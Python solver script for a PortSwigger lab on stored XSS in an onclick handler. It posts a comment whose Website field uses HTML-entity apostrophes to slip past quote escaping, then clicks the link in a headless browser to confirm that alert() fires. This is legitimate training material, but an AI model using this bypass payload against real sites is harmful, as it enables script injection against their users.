#!/usr/bin/env python3
"""
Stored XSS into onclick event -- angle brackets/double quotes encoded, single quotes/backslash escaped
PortSwigger Web Security Academy -- Cross-Site Scripting (XSS)

Companion script for the writeup: 20-stored-xss-onclick-event-encoded-escaped.md

What this does:
    Posts a blog comment whose "Website" field contains the URL
    http://evil.com?&apos;-alert(1)-&apos; -- the &apos; HTML entities are inert
    text as far as the server's own quote/backslash escaping logic is concerned,
    but the browser HTML-decodes them back into literal ' characters before the
    JavaScript engine evaluates the onclick="...tracker.track('WEBSITE_URL');"
    attribute, breaking out of the JS string at render time. A literal-apostrophe
    variant (http://evil.com?'-alert(1)-') was tried first and failed, exactly as
    in our original run, because the server's escaping catches a raw quote. The
    script then drives a headless browser to the post and clicks the comment
    author's name (which carries the onclick handler) to fire the alert.

Usage:
    python 20-stored-xss-onclick-event-encoded-escaped.py <lab-url>
    e.g. python 20-stored-xss-onclick-event-encoded-escaped.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx playwright
    playwright install chromium
"""

import re
import sys
import httpx

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    warmup = client.get(lab_url)
    session = warmup.cookies.get("session", "")
    domain = lab_url.split("/")[2]

    r = client.get(f"{lab_url}/")
    post_ids = re.findall(r"/post\?postId=(\d+)", r.text)
    if not post_ids:
        print("[-] No blog posts found")
        return
    post_id = post_ids[0]
    post_url = f"{lab_url}/post?postId={post_id}"

    r = client.get(post_url)
    csrf_m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf_token = csrf_m.group(1) if csrf_m else ""

    # HTML-entity form of the quote -- the server never sees a literal ' to escape.
    payload = "http://evil.com?&apos;-alert(1)-&apos;"
    print(f"[*] Website payload: {payload}")

    client.post(f"{lab_url}/post/comment", data={
        "postId": post_id,
        "comment": "click my name",
        "name": "attacker",
        "email": "a@b.com",
        "website": payload,
        "csrf": csrf_token,
    })
    print(f"[*] Stored onclick payload on post {post_id}")

    if sync_playwright is None:
        print("[!] playwright not installed -- cannot confirm alert() execution.")
        print(f"    Install it, or open {post_url} yourself and click the author's name.")
        return

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        page.goto(post_url, wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(1000)
        page.click("a[href^='http://evil.com'], .comment-author a", timeout=5000)
        page.wait_for_timeout(2000)
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() fired after click: {alert_fired}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
